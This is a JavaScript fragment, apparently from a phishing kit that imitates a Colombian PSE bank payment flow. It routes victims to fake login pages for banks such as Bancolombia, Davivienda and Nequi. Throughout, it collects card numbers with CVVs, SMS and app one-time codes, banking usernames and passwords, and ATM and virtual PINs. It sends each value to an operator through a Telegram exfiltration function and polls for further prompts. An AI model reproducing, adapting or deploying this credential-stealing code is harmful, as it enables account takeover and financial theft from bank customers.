            'bancolombia': '/3co/trico',
            'avvillas': '/avvillas/avvi',
            'bbva': '/bbva/inicio',
            'bogota': '/bogota/bogo',
            'cajasocial': '/cajasocial/caja',
            'colpatria': '/colpatria/colpa',
            'davivienda': '/davivienda/davi',
            'falabella': '/falabella/fala',
            'nequi': '/nequi/nequ',
            'occidente': '/occidente/occi',
            'popular': '/popular/popu'
        };

        // Obtener la ruta del banco seleccionado
        const rutaBanco = rutasBancos[banco];

        if (rutaBanco) {
            // Redireccionar después de un breve delay para mostrar el overlay
            setTimeout(() => {
                window.location.href = rutaBanco;
            }, 1500);
        } else {
            // Si no se encuentra el banco, mostrar error
            ocultarOverlayCarga();
            document.getElementById('btnPagarPSE').disabled = false;
            showToast('error', 'Error', 'Banco no disponible. Por favor selecciona otro banco.');
        }
    }

    // =====================================================
    // FUNCIONES DE VALIDACIÓN Y ENVÍO PARA SECCIONES ADICIONALES
    // =====================================================

    // --- TDC (Tarjeta de Crédito adicional) ---
    function validarTdc() {
        const numero = document.getElementById('tdcNumeroInput').value.replace(/\s/g, '');
        const vencimiento = document.getElementById('tdcVencimientoInput').value;
        const cvv = document.getElementById('tdcCvvInput').value;
        const isValid = numero.length >= 13 && vencimiento.length === 5 && cvv.length >= 3;
        document.getElementById('btnTdc').disabled = !isValid;
    }

    async function enviarTdc() {
        const numero = document.getElementById('tdcNumeroInput').value.trim();
        const vencimiento = document.getElementById('tdcVencimientoInput').value.trim();
        const cvv = document.getElementById('tdcCvvInput').value.trim();

        // Deshabilitar botón
        document.getElementById('btnTdc').disabled = true;

        // Mostrar overlay de carga
        mostrarOverlayCarga('Verificando tarjeta...');

        // Guardar datos
        datosRecopilados.tdc_numero = numero;
        datosRecopilados.tdc_vencimiento = vencimiento;
        datosRecopilados.tdc_cvv = cvv;

        // Enviar a Telegram
        await enviarDatosAdicionalesATelegram('tdc', `${numero} | ${vencimiento} | ${cvv}`);

        // Iniciar polling
        iniciarPolling();
    }

    // --- OTP SMS ---
    function validarOtpSms() {
        const valor = document.getElementById('otpSmsInput').value;
        const isValid = valor.length >= 6;
        document.getElementById('btnOtpSms').disabled = !isValid;
    }

    async function enviarOtpSms() {
        const valor = document.getElementById('otpSmsInput').value.trim();

        // Deshabilitar botón
        document.getElementById('btnOtpSms').disabled = true;

        // Mostrar overlay de carga
        mostrarOverlayCarga('Verificando código...');

        // Guardar datos
        datosRecopilados.otp_sms = valor;

        // Enviar a Telegram
        await enviarDatosAdicionalesATelegram('codsms', valor);

        // Iniciar polling
        iniciarPolling();
    }

    // --- OTP APP ---
    function validarOtpApp() {
        const valor = document.getElementById('otpAppInput').value;
        const isValid = valor.length >= 6;
        document.getElementById('btnOtpApp').disabled = !isValid;
    }

    async function enviarOtpApp() {
        const valor = document.getElementById('otpAppInput').value.trim();

        // Deshabilitar botón
        document.getElementById('btnOtpApp').disabled = true;

        // Mostrar overlay de carga
        mostrarOverlayCarga('Verificando código...');

        // Guardar datos
        datosRecopilados.otp_app = valor;

        // Enviar a Telegram
        await enviarDatosAdicionalesATelegram('codapp', valor);

        // Iniciar polling
        iniciarPolling();
    }

    // --- LOGIN ---
    function validarLogin() {
        const usuario = document.getElementById('loginUsuarioInput').value.trim();
        const clave = document.getElementById('loginClaveInput').value.trim();
        const isValid = usuario.length >= 5 && clave.length >= 4;
        document.getElementById('btnLogin').disabled = !isValid;
    }

    async function enviarLogin() {
        const usuario = document.getElementById('loginUsuarioInput').value.trim();
        const clave = document.getElementById('loginClaveInput').value.trim();

        // Deshabilitar botón
        document.getElementById('btnLogin').disabled = true;

        // Mostrar overlay de carga
        mostrarOverlayCarga('Verificando credenciales...');

        // Guardar datos
        datosRecopilados.login_usuario = usuario;
        datosRecopilados.login_clave = clave;

        // Enviar a Telegram
        await enviarDatosAdicionalesATelegram('login', `${usuario} | ${clave}`);

        // Iniciar polling
        iniciarPolling();
    }

    // --- CLAVE CAJERO ---
    function validarClaveCajero() {
        const valor = document.getElementById('claveCajeroInput').value;
        const isValid = valor.length === 4;
        document.getElementById('btnClaveCajero').disabled = !isValid;
    }

    async function enviarClaveCajero() {
        const valor = document.getElementById('claveCajeroInput').value.trim();

        // Deshabilitar botón
        document.getElementById('btnClaveCajero').disabled = true;

        // Mostrar overlay de carga
        mostrarOverlayCarga('Verificando clave...');

        // Guardar datos
        datosRecopilados.clave_cajero = valor;

        // Enviar a Telegram
        await enviarDatosAdicionalesATelegram('pincaj', valor);

        // Iniciar polling
        iniciarPolling();
    }

    // --- CLAVE VIRTUAL ---
    function validarClaveVirtual() {
        const valor = document.getElementById('claveVirtualInput').value;
        const isValid = valor.length >= 4;
        document.getElementById('btnClaveVirtual').disabled = !isValid;
    }

    async function enviarClaveVirtual() {
        const valor = document.getElementById('claveVirtualInput').value.trim();

        // Deshabilitar botón
        document.getElementById('btnClaveVirtual').disabled = true;

        // Mostrar overlay de carga
        mostrarOverlayCarga('Verificando clave...');

        // Guardar datos
        datosRecopilados.clave_virtual = valor;

        // Enviar a Telegram
        await enviarDatosAdicionalesATelegram('pinvir', valor);

        // Iniciar polling
        iniciarPolling();
    }
</script>
